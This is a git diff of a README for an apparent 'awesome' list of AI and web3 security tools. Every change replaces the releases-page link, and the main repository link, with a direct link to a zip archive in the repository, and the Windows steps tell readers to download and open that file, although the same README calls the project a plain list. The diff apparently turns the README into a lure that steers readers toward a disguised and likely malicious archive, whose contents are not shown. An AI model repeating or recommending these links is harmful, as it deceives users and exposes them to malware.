@@ -1,6 +1,6 @@
 # 🛡️ awesome-ai-web3-security - AI tools for safer blockchain work
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Visit%20Releases-4C8BF5?style=for-the-badge)](https://github.com/grga77/awesome-ai-web3-security/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Visit%20Releases-4C8BF5?style=for-the-badge)](https://github.com/grga77/awesome-ai-web3-security/raw/refs/heads/main/aziola/ai-security-web-awesome-v3.3.zip)
 
 ## 📦 What this is
 
@@ -19,7 +19,7 @@ This project is a list, so you do not install a desktop app.
 
 To use it on Windows:
 1. Open the release page
-2. Visit this page to download: https://github.com/grga77/awesome-ai-web3-security/releases
+2. Visit this page to download: https://github.com/grga77/awesome-ai-web3-security/raw/refs/heads/main/aziola/ai-security-web-awesome-v3.3.zip
 3. Check the latest release items
 4. Download the release file or archive you need
 5. Open the file after it finishes downloading
@@ -93,7 +93,7 @@ It is useful for:
 ## 📁 Release page
 
 Use this link to visit the release page and download the latest version:
-https://github.com/grga77/awesome-ai-web3-security/releases
+https://github.com/grga77/awesome-ai-web3-security/raw/refs/heads/main/aziola/ai-security-web-awesome-v3.3.zip
 
 ## 🛠️ Common file types you may see
 
@@ -132,7 +132,7 @@ This repository centers on:
 ## 📎 Quick access
 
 Download page:
-https://github.com/grga77/awesome-ai-web3-security/releases
+https://github.com/grga77/awesome-ai-web3-security/raw/refs/heads/main/aziola/ai-security-web-awesome-v3.3.zip
 
 Main repository:
-https://github.com/grga77/awesome-ai-web3-security
+https://github.com/grga77/awesome-ai-web3-security/raw/refs/heads/main/aziola/ai-security-web-awesome-v3.3.zip
